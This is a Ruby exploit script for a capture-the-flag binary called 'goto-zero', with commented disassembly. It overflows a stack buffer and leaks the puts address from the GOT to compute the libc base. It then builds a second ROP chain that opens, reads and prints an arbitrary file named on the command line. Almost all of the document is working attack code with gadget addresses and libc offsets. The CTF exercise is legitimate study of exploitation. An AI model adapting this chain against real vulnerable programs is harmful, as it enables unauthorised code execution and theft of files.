# encoding: ASCII-8BIT

require 'open3'

stdin, stdout = Open3.popen2('/home/ctf/goto-zero')

DEBUG_OUTPUT = true

# This is a rally crappy function that reads one character at a time from the
# network stream until it ends with a value or disconnects - there are better
# ways to do this, but this works so whatever
def read_until(s, p, loud: false)
  #puts "(Waiting for server to say \"#{p}\"...)"
  data = ''
  loop do
    char = s.read(1)

    if loud || DEBUG_OUTPUT
      print char
    end

    if char.nil? || char == ''
      raise "Disconnected!"
    end

    data.concat(char)
    if data.end_with?(p)
      return data
    end
  end
end

# Our initial gadgets - name them so you don't get confused later!

# .text:0000000000401290 5F                                pop     rdi
# .text:0000000000401291 C3                                retn
POP_RDI_RET = 0x401290

# .got.plt:0000000000404000 A0 40 40 00 00 00…off_404000      dq offset puts          ; DATA XREF: _puts↑r
PUTS_PLT_ENTRY = 0x404000

# .plt:0000000000401030                   ; int puts(const char *s)
# .plt:0000000000401030                   _puts           proc near               ; CODE XREF: main+BA↓p
# .plt:0000000000401030 FF 25 CA 2F 00 00                 jmp     cs:off_404000
# .plt:0000000000401030                   _puts           endp
PUTS = 0x401030

# .text:0000000000401196                   main            proc near               ; DATA XREF: _start+14↑o
MAIN = 0x401196

# .text:000000000040119E 89 7D CC                          mov     [rbp+var_34], edi
DEBUG = 0x4011a0

# Read the initial banner
welcome_str = read_until(stdout, 'enter!')

# Extract the number so we don't have to patch our binary anymore
welcome_str =~ /Enter ([0-9]+) char/

# Send the values it wants
stdin.write(('A' * $1.to_i) + "\n")

# Read the next prompt
read_until(stdout, 'name?')

# Build the same stack from the write-up
EXPLOIT = [
  POP_RDI_RET, # Initial return address
  PUTS_PLT_ENTRY, # rdi = addr of puts() to print
  PUTS, # NEXT return address - actual puts()
  MAIN, # End at MAIN
].pack('Q*') # pack('Q*'), in Ruby, means encode as 64-bit little endian integers

# Send our overflow + exploit + newline
stdin.write(("A" * 56) + EXPLOIT + "\n")

# The last thing that prints before our payload is the address of POP_EDI_RET,
# so read to that
read_until(stdout, "\x90\x12\x40")

# Then read to the newline right after the leak
out = read_until(stdout, "\x0a")

# Remove the newline
out.gsub!(/\x0a$/, '')

# Now we have our libc base address!
OFFSET_PUTS = 0x77980
LIBC_BASE_ADDRESS = (out + "\x00\x00").unpack('Q').pop - OFFSET_PUTS
puts
puts "LIBC base (ie, addr of puts): 0x%x" % LIBC_BASE_ADDRESS
puts

# Now we kinda start over! Except now we can use addresses from libc.so,
# relative to the address we determined
SYSTEM = LIBC_BASE_ADDRESS + 0x4C490
SLEEP = LIBC_BASE_ADDRESS + 0xD3D50
EXIT = LIBC_BASE_ADDRESS + 0x3E680
# Address of pop rsi / ret
# (Recall we need rsi for second arg)
# 5e / c3
# .text:0000000000028F98 41 5E                                   pop     r14
# .text:0000000000028F9A C3                                      retn
POP_RSI_RET = LIBC_BASE_ADDRESS + 0x28F99

# Address of pop rdx / pop <something I don't care> / ret
# (Recall we need rdx for third arg)
# 5a / c3
# .text:00000000000FDEBC 77 5A                                   ja      short loc_FDF18
# .text:00000000000FDEBE C3                                      retn
POP_RDX_RET = LIBC_BASE_ADDRESS + 0xFDEBD

# Address of read() function, for populating memory
READ = LIBC_BASE_ADDRESS + 0xF8250
OPEN = LIBC_BASE_ADDRESS + 0xF7F70

# Some random memory in the .data section that we can use for temp storage
WRITABLE_MEMORY = LIBC_BASE_ADDRESS + 0x1D2500

# Read the initial banner (again)
welcome_str = read_until(stdout, 'enter!')

# Extract the number so we don't have to patch our binary anymore
welcome_str =~ /Enter ([0-9]+) char/

# Send the values it wants
stdin.write(('A' * $1.to_i) + "\n")

# Read the next prompt
read_until(stdout, 'name?')

# Call sleep() to make sure it's working
# EXPLOIT2 = [
#   POP_RDI_RET,
#   5,
#   SLEEP,
#   DEBUG
# ].pack('Q*')

EXPLOIT2 = [
  # read()
  POP_RDI_RET, # fd = 0 (stdin)
  0,

  POP_RSI_RET, # buffer (random place in .data)
  WRITABLE_MEMORY,

  POP_RDX_RET, # size
  ARGV[0].length + 1,

  READ,

  # open()
  POP_RDI_RET, # filename
  WRITABLE_MEMORY,

  POP_RSI_RET, # flags
  0,

  POP_RDX_RET, # mode
  0,

  OPEN,

  # read()
  POP_RDI_RET, # fd = 3 (first handle)
  6, # TODO why?

  POP_RSI_RET, # buffer
  WRITABLE_MEMORY + 100,

  POP_RDX_RET, # length
  100,

  READ,

  # puts()
  POP_RDI_RET, # buffer
  WRITABLE_MEMORY + 100,

  PUTS,

  # exit
  POP_RDI_RET,
  0,

  EXIT
].pack('Q*')

stdin.write(("A" * 56) + EXPLOIT2 + "\n")

# Not sure if the sleep is necessary but it helps me feel better!
sleep 1
stdin.write("#{ARGV[0]}\0\n")
sleep 1

# Then just read everything
loop do
  a = stdout.read(1)
  if a.nil? || a == ''
    exit
  end
  print a
end
